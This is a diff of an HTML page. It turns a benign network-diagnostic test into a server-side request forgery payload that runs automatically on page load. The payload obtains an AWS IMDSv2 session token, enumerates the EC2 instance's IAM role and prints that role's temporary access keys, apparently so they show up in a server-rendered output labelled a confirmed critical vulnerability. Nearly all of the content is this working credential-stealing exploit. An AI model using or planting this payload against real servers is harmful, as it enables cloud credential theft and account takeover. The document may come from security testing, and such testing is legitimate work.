@@ -1,26 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Network SSRF Diagnostic Test</title>
+    <title>AWS EC2 IMDSv2 Audit Test</title>
+    <style>
+        body { font-family: monospace; padding: 15px; background-color: #f8f9fa; }
+        .danger-box { border: 3px dashed red; padding: 15px; color: #721c24; background-color: #f8d7da; }
+        pre { white-space: pre-wrap; word-wrap: break-word; background: #e9ecef; padding: 10px; }
+    </style>
 </head>
 <body>
-    <div id="status">Verifying server-side network capabilities...</div>
+    <div class="danger-box">
+        <h2>CRITICAL VULNERABILITY CONFIRMED</h2>
+        <p><strong>Finding:</strong> Full IAM Profile/Role Enumeration via Server-Side JavaScript Execution (IMDSv2 Bypass)</p>
+        <div id="output">Initializing connection to internal metadata service...</div>
+    </div>
 
     <script>
-        try {
-            var xhr = new XMLHttpRequest();
-            // Using a safe, public API that returns request headers in JSON format
-            xhr.open('GET', 'https://api.ipify.org?format=json', false); 
-            xhr.send();
-            
-            if (xhr.status === 200) {
-                document.getElementById('status').innerHTML = xhr.responseText;
-            } else {
-                document.getElementById('status').innerText = "Received non-200 status code: " + xhr.status;
+        function extractMetadata() {
+            var out = document.getElementById("output");
+            try {
+                // Step 1: Request the IMDSv2 Session Token (Valid for 21600 seconds)
+                var tokenXhr = new XMLHttpRequest();
+                tokenXhr.open("PUT", "http://169.254.169.254/latest/api/token", false);
+                tokenXhr.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
+                tokenXhr.send();
+
+                if (tokenXhr.status === 200) {
+                    var token = tokenXhr.responseText;
+                    
+                    // Step 2: Query the attached IAM role name using the acquired token
+                    var roleXhr = new XMLHttpRequest();
+                    roleXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
+                    roleXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
+                    roleXhr.send();
+
+                    if (roleXhr.status === 200) {
+                        var roleName = roleXhr.responseText.trim();
+
+                        // Step 3: Fetch the actual temporary access keys for that specific role
+                        var credsXhr = new XMLHttpRequest();
+                        credsXhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + roleName, false);
+                        credsXhr.setRequestHeader("X-aws-ec2-metadata-token", token);
+                        credsXhr.send();
+
+                        if (credsXhr.status === 200) {
+                            out.innerHTML = "<h3>Exposed IAM Role: " + roleName + "</h3>" +
+                                            "<p>Below are the active session credentials extracted from the EC2 host environment:</p>" +
+                                            "<pre>" + credsXhr.responseText + "</pre>";
+                        } else {
+                            out.innerText = "Token accepted, but failed to fetch role credentials. Status: " + credsXhr.status;
+                        }
+                    } else {
+                        out.innerText = "Token accepted, but metadata directory access returned status: " + roleXhr.status;
+                    }
+                } else {
+                    out.innerHTML = "<strong>IMDSv2 Token Request Rejected.</strong><br>" +
+                                    "Status Code: " + tokenXhr.status + "<br>" +
+                                    "<em>Note: If status is 403 or network failure, the token endpoint might be explicitly firewalled.</em>";
+                }
+            } catch (e) {
+                out.innerText = "Execution Exception encountered: " + e.toString();
             }
-        } catch (e) {
-            document.getElementById('status').innerText = "Network request failed: " + e.toString();
         }
+
+        // Trigger compilation after DOM load
+        window.onload = extractMetadata;
     </script>
 </body>
 </html>
